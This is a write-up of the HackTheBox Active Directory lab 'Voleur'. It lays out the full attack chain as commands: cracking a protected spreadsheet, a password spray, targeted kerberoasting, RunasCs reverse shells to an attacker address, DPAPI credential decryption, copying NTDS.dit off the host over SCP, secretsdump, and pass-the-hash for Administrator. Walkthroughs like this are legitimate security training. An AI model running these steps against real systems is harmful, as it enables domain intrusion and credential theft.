---
title: "Voleur HackTheBox" 
date: 2025-11-2 2:00:00 0000+
categories: [WriteUps, HackTheBox]
tags: [WriteUp, Voleur, HTB, Enumeration, Active Directory, SSH, WSL, DeletedADObjects, RealmFix, Hash Cracking, Kerberoasting, Lateral Movement, Bloodhound, RunasCs, DPAPI, VaultCred, Privilege Escalation, Windows]
image:
  path: /assets/images/Voleur_HTB/preview_voleur.png
---
# Voleur HTB Writeup

Voleur is a medium level Active Directory Hackthebox machine which is based on the assumed breach scenario (means we have valid credentials).

This focusses on kerberos authentication, realm fixation, hash cracking, Bloodhound enumeration, kerberoasting, RunasCs.exe for switching users, extracting DPAPI Vault credentials, recovering deleted AD Objects, lateral movement through users, SSH into WSL and finally using secretsdump to extract secrets from the backups to obtain administrator access. 

![image.png](/assets/images/Voleur_HTB/image.png)

## Initial Enumeration

We are gonna start off with the rustmap to find the open ports and services running on the box.

```bash
rustmap.py -ip 10.129.248.243
```

![image.png](/assets/images/Voleur_HTB/image%201.png)

![image.png](/assets/images/Voleur_HTB/image%202.png)

### SMB Enumeration

I tried to enumerate shares on the box with the given credentials but it results in errors.

```bash
nxc smb 10.129.248.243 -u 'ryan.naylor' -p 'HollowOct31Nyt' --shares
```

![image.png](/assets/images/Voleur_HTB/image%203.png)

And if we try to enumerate shares while authenticating with Kerberos it says KDC_ERR_WRONG_REALM

![image.png](/assets/images/Voleur_HTB/image%204.png)

### LDAP Enumeration

Tried to do the LDAP enumeration

```bash
nxc ldap voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt'
```

![image.png](/assets/images/Voleur_HTB/image%205.png)

Tried with the Kerberos Authentication

```bash
nxc ldap voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k
```

![image.png](/assets/images/Voleur_HTB/image%206.png)

It successfully authenticates via Kerberos authentication.

Enumerated users using the —users flag.

```bash
nxc ldap voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --users
```

![image.png](/assets/images/Voleur_HTB/image%207.png)

Stored all the users to the usernames.txt file.

## Realm Fixation

After getting the above REALM ERROR within SMB enumeration I searched through the internet and found some amazing posts to fix the Kerberos Realm.

I simply created a /etc/krb5.conf file and wrote these contents in it.

```bash
[libdefaults]   
        default_realm = VOLEUR.HTB
        fcc-mit-ticketflags = true

[realms]
        VOLEUR.HTB = {
                kdc = DC.VOLEUR.HTB
                admin_server = DC.VOLEUR.HTB
        }
```

And then we used kinit to generate a TGT for ryan.naylor

```bash
kinit ryan.naylor
```

![image.png](/assets/images/Voleur_HTB/image%208.png)

### SMB Enumeration 2

Now I again tried to list SMB shares.

**NOTE: HERE USE THE DC NAME LIKE DC.VOLEUR.HTB, WHILE LISTING SHARES.**

```bash
nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k
```

![image.png](/assets/images/Voleur_HTB/image%209.png)

Now connecting to the smb share using the FQDN of the DC.

```bash
smbclient //dc.voleur.htb/IT -U 'ryan.naylor'%'HollowOct31Nyt' -k
```

![image.png](/assets/images/Voleur_HTB/image%2010.png)

Inspecting this Access_Review.xlsx file.

And this file is password protected.

![image.png](/assets/images/Voleur_HTB/image%2011.png)

## Exploitation

Using office2john to obtain a hash JTR format.

```bash
office2john Access_review.xlsx > accessreview.hash
```

![image.png](/assets/images/Voleur_HTB/image%2012.png)

Running JTR to crack the hash

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt accessreview.hash
```

![image.png](/assets/images/Voleur_HTB/image%2013.png)

Opening the Access_review.xlsx with the above password, displays the following data.

![image.png](/assets/images/Voleur_HTB/image%2014.png)

Added all the potential passwords to the passwords.txt file.

Now performing a password spray attack with usernames.txt and the potential passwords found.

```bash
nxc ldap voleur.htb -u usernames.txt -p passwords.txt -k --continue-on-success
```

![image.png](/assets/images/Voleur_HTB/image%2015.png)

Got two valid hits saved them to the creds.txt file.

I tried testing these both accounts to enumerate some interesting shares but did not find anything useful.

```bash
nxc smb dc.voleur.htb -u 'svc_iis' -p 'N5pXyW1VqM7CZ8' -k  --shares
nxc smb dc.voleur.htb -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -k  --shares
```

![image.png](/assets/images/Voleur_HTB/image%2016.png)

### Bloodhound

Started with the bloodhound enumeration.

```bash
bloodhound-python -u 'ryan.naylor' -p 'HollowOct31Nyt' -dc dc.voleur.htb -d voleur.htb -ns 10.129.244.243 -c all --zip
```

Sync the DC time

```bash
ntpdate 10.129.244.243
```

![image.png](/assets/images/Voleur_HTB/image%2017.png)

Marking **svc_ldap, svc_iis, ryan.naylor** as owned in bloodhound.

Looking at the **Shortest Path from Owned Principals.**

![image.png](/assets/images/Voleur_HTB/image%2018.png)

### SVC_LDAP → SVC_WINRM

User svc_ldap has WriteSPN permissions on svc_winrm means we can add a fake SPN to the svc_winrm such as “HTTP/fakehost” means we can kerberoast it.

Then we can request a TGS for the same account, and since the TGS is encrypted using the Alfred’s NTLM hash we can crack it offline. 

---

Doing targetedkerberoasting on user svc_winrm.

**I struggled here a bit because the NTLM Authentication is disabled.**

**Also for this targeted kerberoasting to work we first requested the TGT of the svc_ldap user using the impacket-getTGT.**

**Then exporting it to our Kerberos env variable.**

```bash
impacket-getTGT voleur.htb/svc_ldap:M1XyC9pW7qT5Vn
```

![image.png](/assets/images/Voleur_HTB/image%2019.png)

Now we are going to kerberoast the users with targetedkerberoast.py

**NOTE: LOOK AT THE —DC-HOST PARAMETER IT CONTAINS THE DC NAME WHICH IS DC.VOLEUR.HTB, IF WE ARE USING THE —DC-HOST PARAMETER IT MEANS WE ARE NOT AUTHENTICATING WITH NTLM AUTHENTICATION WE ARE USING THE KERBEROS AUTHENTICATION.**

Also here the -k parameter uses the .ccache file to authenticate us which we exported earlier. 

```bash
/opt/targetedKerberoast/targetedKerberoast.py -d voleur.htb -k --no-pass --dc-host dc.voleur.htb
```

![image.png](/assets/images/Voleur_HTB/image%2020.png)

Saved these both hashes to separate hash files.

Using **hashcat** to crack those hashes.

We couldn’t able to crack the hash of lacey.miller@voleur.htb, but we cracked it for svc_winrm.

```bash
hashcat -m 13100 svc_winrmkrbhash.txt /usr/share/wordlists/rockyou.txt
```

![image.png](/assets/images/Voleur_HTB/image%2021.png)

saved these creds to the creds.txt file.

**Now again we request a TGT for the svc_winrm user, to login with Evil-winrm.**

```bash
impacket-getTGT voleur.htb/svc_winrm:'AFireInsidedeOzarctica980219afi'
```

![image.png](/assets/images/Voleur_HTB/image%2022.png)

![image.png](/assets/images/Voleur_HTB/image%2023.png)

Grabbing that user.txt file and submitting it.

## Privilege Escalation

I enumerated the machine with user **svc_winrm** but didn’t find anything useful.

I also enumerated the deleted objects but didn’t find anything, so I used **RunasCs.exe** to get a shell as **svc_ldap** user.

[https://github.com/antonioCoco/RunasCs](https://github.com/antonioCoco/RunasCs)

Uploaded the binary to our remote machine and set up a listener on our local machine.

Since we know from above that there is a deleted user in the domain name **Todd.Wolfe**

```bash
./RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell.exe -r 10.10.14.72:9002
```

![image.png](/assets/images/Voleur_HTB/image%2024.png)

This gave me a hit back at my listener on port 9002.

![image.png](/assets/images/Voleur_HTB/image%2025.png)

Now enumerated for the deleted objects and found our user **Todd.Wolfe**.

```bash
Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects
```

![image.png](/assets/images/Voleur_HTB/image%2026.png)

Now lets recover this user.

```bash
Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
```

![image.png](/assets/images/Voleur_HTB/image%2027.png)

We successfully recovered **Todd.Wolfe** back.

![image.png](/assets/images/Voleur_HTB/image%2028.png)

This user is a part of **Second-Line Technicia** and **Domain Users** group.

Now previously in the xlsx file we found the credentials for the **Todd.Wolfe** user we can check its authentication.

```bash
nxc ldap voleur.htb -k --verbose -u todd.wolfe -p 'NightT1meP1dg3on14'
```

![image.png](/assets/images/Voleur_HTB/image%2029.png)

NetExec gives us successful authentication with **Todd.Wolfe**

### Bloodhound 2

After enabling **Todd.Wolfe** again gathered ldap data using bloodhound-python.

```bash
bloodhound-python -u 'ryan.naylor' -p 'HollowOct31Nyt' -dc dc.voleur.htb -d voleur.htb -ns 10.129.244.243 -c all --zip
```

![image.png](/assets/images/Voleur_HTB/image%2030.png)

Now I enumerated through bloodhound but did not found anything.

### Shell as Todd.Wolfe

Again, running RunasCs.exe to gain the shell as **Todd.Wolfe**.

```bash
./RunasCs.exe todd.wolfe NightT1meP1dg3on14 powershell.exe -r 10.10.14.72:9002
```

![image.png](/assets/images/Voleur_HTB/image%2031.png)

Uploaded winpeas.exe to the **svc_winrm** shell and found its DPAPI keys and credentials.

![image.png](/assets/images/Voleur_HTB/image%2032.png)

Downloading the DPAPI Master Key and the Credential file.

```powershell
C:\Users\svc_winrm\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1601\2df1d8a3-cb47-4723-9d2e-b826b57a3952
CredFile: C:\Users\svc_winrm\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
```

Now using impacket’s DPAPI module to extract secrets from it, But it just errors out with nothing, here we get a hint that we can do the same for **Todd.Wolfe** user.

So transferred the winpeas.exe (I changed it to win.exe) to the todd.wolfe user shell using certutil.exe, and finally executing it.

![image.png](/assets/images/Voleur_HTB/image%2033.png)

Running winpeas.exe on **todd.wolfe** is of no use.

### SMB Enumeration 3

With the Todd.Wolfe enabled we saw that he is a part of **Second-line Support Technicians.**

![image.png](/assets/images/Voleur_HTB/image%2034.png)

So accessing its share using smb as T**odd.Wolfe**

![image.png](/assets/images/Voleur_HTB/image%2035.png)

He can read IT Share.

Accessing the share and enumerating through it gives us the DPAPI Masterkey and Credential files.

![image.png](/assets/images/Voleur_HTB/image%2036.png)

Now downloading the credential file.

![image.png](/assets/images/Voleur_HTB/image%2037.png)

So we now have Masterkey, Credential file.

### Shell as Jeremy.Combs

Now using the Impacket’s DPAPI module to extract secrets from it.

```bash
impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -password 'NightT1meP1dg3on14' -sid S-1-5-21-3927696377-1337352550-2781715495-1110
```

![image.png](/assets/images/Voleur_HTB/image%2038.png)

This gives us the decrypted key, we can use this key to extract secrets from the credential file.

```bash
impacket-dpapi credential -f '772275FAD58525253490A9B0039791D3' -key '0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83'
```

![image.png](/assets/images/Voleur_HTB/image%2039.png)

This gives us the clear text credentials of the **jeremy.combs** user.

Saved those credentials to our creds.txt file, also validated that the credentials are ok.

![image.png](/assets/images/Voleur_HTB/image%2040.png)

Now since **Jeremy.combs** is a part of **Third-Line Support Technicians.**

Using Jeremy’s TGT to get their shell.

![image.png](/assets/images/Voleur_HTB/image%2041.png)

Now as Jeremy we have access to the Third-Line Support technicians.

![image.png](/assets/images/Voleur_HTB/image%2042.png)

### Shell as Administrator

After reading Note.txt.txt and downloading id_rsa, Here I enumerated a lot but did not find anything useful.

I gone through all the users on the box, there is one named **svc_backup.**

Also earlier we noticed in the nmap output that port 2222 is running open ssh server.

And since we have id_rsa, I tried sshing to the box with **svc_backup** user.

![image.png](/assets/images/Voleur_HTB/image%2043.png)

And we have a valid SSH Shell.

This is WSL so the windows is mounted in the /mnt directory.

Found the ntds.dit hive in the backups folder which earlier as Jeremy we dont have access to.

![image.png](/assets/images/Voleur_HTB/image%2044.png)

And in the registry folder we have the SYSTEM and SECURITY hives too, downloading them too using our python3 web server.

Unfortunately with python we cannot download the files.

Using scp to transfer the whole Backup folder to our attacker machine.

```bash
scp -i id_rsa -P 2222 -r "svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line Support/Backups" ./
```

![image.png](/assets/images/Voleur_HTB/image%2045.png)

Now using impacket’s secretsdump we dump the whole database.

```bash
impacket-secretsdump -ntds Active\ Directory/ntds.dit -system registry/SYSTEM LOCAL
```

![image.png](/assets/images/Voleur_HTB/image%2046.png)

Now using Administrator hash to get its TGT.

```bash
impacket-getTGT -hashes aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2 'voleur.htb/Administrator'
```

![image.png](/assets/images/Voleur_HTB/image%2047.png)

![image.png](/assets/images/Voleur_HTB/image%2048.png)

Thanks for reading !

![image.png](/assets/images/Voleur_HTB/image%2049.png)
